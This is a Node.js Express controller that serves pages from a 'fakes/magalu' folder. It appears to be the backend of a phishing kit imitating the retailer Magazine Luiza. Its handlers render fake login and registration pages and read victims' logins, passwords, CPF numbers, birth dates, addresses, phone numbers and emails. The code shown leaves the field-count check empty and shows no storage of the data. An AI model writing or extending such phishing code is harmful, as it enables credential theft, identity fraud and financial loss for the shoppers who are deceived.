const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const path = require('path');

const magaluModel = require('../models/Magalu.model');

exports.page = async (req, res, next) => {
    try {
        const { page } = req.params;

        const { to, from, interest, amount } = await magaluModel.findOne({
            where: {
                page: page,
            },
        });

        return res.render(`fakes/magalu/${page}`, {
            to: to,
            from: from,
            interest: interest,
            amount: amount,
        });
    } catch (err) {
        return res.render('errors/users/magalu500');
    }
};

exports.login = async (req, res, next) => {
    try {
        const { id } = req.params;

        const { login, password } = req.body;

        return res.render('fakes/magalu/login', {
            id: id,
        });
    } catch (err) {
        console.log(err);
        return res.render('errors/users/magalu500');
    }
};

exports.register = async (req, res, next) => {
    try {
        const { id } = req.params;

        const {
            cpf, fullName, birthDate, password, zipcode,
            address, number, complement, neighbourhood,
            city, state, reference, telephone, email
        } = req.body;

        if (Object.keys(req.body).length >= 10) {
            
        }

        const product = await magaluModel.findOne({
            where: {
                page: id,
            },
        });
        
        return res.render('fakes/magalu/register', {
            id: id,
            product: product,
        });
    } catch (err) {
        console.log(err);
        return res.render('errors/users/magalu500');
    }
};

exports.sacola = async (req, res, next) => {
    try {
        return res.render('fakes/magalu/sacola');
    } catch (err) {
        console.log(err);
        return res.render('errors/users/magalu500');
    }
};